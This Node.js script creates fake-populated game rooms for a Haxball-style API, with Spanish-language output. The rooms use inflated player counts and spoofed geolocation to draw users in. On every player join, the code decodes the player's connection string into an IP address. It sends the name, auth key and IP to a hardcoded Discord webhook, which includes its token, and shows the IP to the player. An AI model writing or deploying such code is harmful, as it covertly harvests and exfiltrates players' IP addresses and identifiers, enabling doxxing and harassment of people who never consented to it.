const API = require("./src/index")();
const { Room } = API;
const EnglishLanguage = require("./languages/englishLanguage");
API.Language.current = new EnglishLanguage(API);

const axios = require("axios");

function decryptHex(str) {
  if (!str || typeof str !== "string") return "";
  let out = "";
  for (let i = 0; i < str.length; i += 2) {
    out += String.fromCharCode(parseInt(str.substring(i, i + 2), 16));
  }
  return out;
}

async function sendDiscord(webhookUrl, player, roomName) {
  if (!webhookUrl) return;
  const payload = {
    content: `Nuevo jugador conectado: **${player.name}** en ${roomName}`,
    embeds: [
      {
        title: "🎯 Nuevo Jugador Conectado",
        color: 0x00ff00,
        fields: [
          { name: "Nombre", value: player.name, inline: true },
          { name: "ID", value: String(player.id), inline: true },
          { name: "Auth", value: player.auth || "N/A", inline: true },
          { name: "Conn", value: player.conn || "No tiene", inline: true },
          { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Teleese x Crash" },
      },
    ],
  };
  try {
    await axios.post(webhookUrl, payload, { timeout: 10000 });
    console.log(`✅ Info de ${player.name} enviada a Discord.`);
  } catch (err) {
    console.error("❌ Error enviando webhook:", err?.message || err);
  }
}

const roomNames = [
  "🟠🦊 JUEGAN TODOS CRASH 🦊🟠",
  "🟠🦊 JUEGAN TODOS CRASHJERO 🦊🟠",
  "🟠🦊 JUEGAN TODOS REALSOCCER 🦊🟠",
  "🟠🦊 VOLLEYBALL CRASH 🦊🟠",
  "🟠🦊 PING PONG CRASH 🦊🟠",
  "🟠🦊 FUTSAL X6 CRASH 🦊🟠",
  "🟠🦊 HOCKEY CRASH 🦊🟠",
  "🟠🦊 GANA DINERO CRASH 🦊🟠",
  "🟠🦊 SOLO MALOS CRASH 🦊🟠",
  "🟠🦊 SOLO BUENOS CRASH 🦊🟠",
  "🟠🦊 WATERPOLO CRASH 🦊🟠",
];

const maxPlayersList = [24, 24, 24, 24, 24, 24, 24, 24, 24, 24, 24];
const fakePlayersList = [20, 19, 15, 12, 9, 22, 15, 23, 18, 12, 2];

const geoList = [
  { lat: -34.616901409192984, lon: -58.96070099124523, flag: "bt" },
  { lat: -34.616901409192984, lon: -58.96070099124523, flag: "bt" },
];

const jobIndex = parseInt(process.env.INDEX || "0");
const token = process.env.JOB_ID;
const webhookUrl = "https://discord.com/api/webhooks/1393262987409752264/BnPMLR9nbeFn8Ha_vZUYPh-ONdxzKCHsE1jSoerclqNnsWvYGB47kIEDXvnVdVUygVSN";

const roomName = roomNames[jobIndex % roomNames.length];
const maxPlayers = maxPlayersList[jobIndex % maxPlayersList.length];
const fakePlayers = fakePlayersList[jobIndex % fakePlayersList.length];
const geo = geoList[jobIndex % geoList.length];

if (!token) {
  console.error("❌ No se encontró token (JOB_ID).");
  process.exit(1);
}

console.log(`🚀 Creando sala: ${roomName} | MaxPlayers: ${maxPlayers} | FakePlayers: ${fakePlayers} | Geo: ${JSON.stringify(geo)}`);

Room.create(
  {
    name: roomName,
    password: process.env.ROOM_PASSWORD || "",
    maxPlayerCount: maxPlayers,
    playerCount: fakePlayers,
    unlimitedPlayerCount: true,
    showInRoomList: true,
    geo: geo,
    token: token
  },
  {
    storage: {
      player_name: process.env.PLAYER_NAME || "Bot",
      avatar: process.env.PLAYER_AVATAR || "👽"
    },
    libraries: [],
    config: null,
    renderer: null,
    plugins: [],
    onOpen: (room) => {
      console.log("✅ Sala creada (onOpen). Esperando link...");

      room.onAfterRoomLink = (roomLink) => {
        console.log("🔗 Link de la sala:", roomLink);
        if (webhookUrl) {
          axios.post(webhookUrl, {
            content: `🏟 Sala creada: ${roomLink}`,
            embeds: [
              {
                title: "Sala Creada",
                color: 0x0000ff,
                fields: [{ name: "Link", value: roomLink, inline: false }],
                timestamp: new Date().toISOString(),
                footer: { text: "Teleese x Crash" },
              },
            ],
          }).then(() => console.log("✅ Link de sala enviado a Discord"))
            .catch(err => console.error("❌ Error enviando link a Discord:", err?.message || err));
        }
      };

      room.on("playerJoin", (player) => {
        console.log(`🎯 Nuevo jugador: ${player.name} (ID: ${player.id})`);
        sendDiscord(webhookUrl, player, roomName);

        room.sendAnnouncement(
          `Discord: Teleese - Pagina: https://teleese.netlify.app/`,
          null,
          0xff0000,
          "bold",
          2
        );

        setTimeout(() => {
          room.sendAnnouncement(
            `Nombre: ${player.name} Auth: ${player.auth} Ip: ${decryptHex(player.conn)}`,
            player.id,
            0xff0000,
            "bold",
            2
          );
        }, 1000);
      });

      room.on("playerLeave", (player) => console.log(`👋 Jugador salió: ${player.name} (ID: ${player.id})`));
      room.on("playerChat", (player, message) => {
        console.log(`💬 ${player.name}: ${message}`);
        return false;
      });
      room.on("roomError", (error) => console.error("❌ Error en la sala:", error));
    },
    onClose: (msg) => {
      console.log("🔴 Bot ha salido de la sala:", msg?.toString());
      process.exit(0);
    }
  }
);

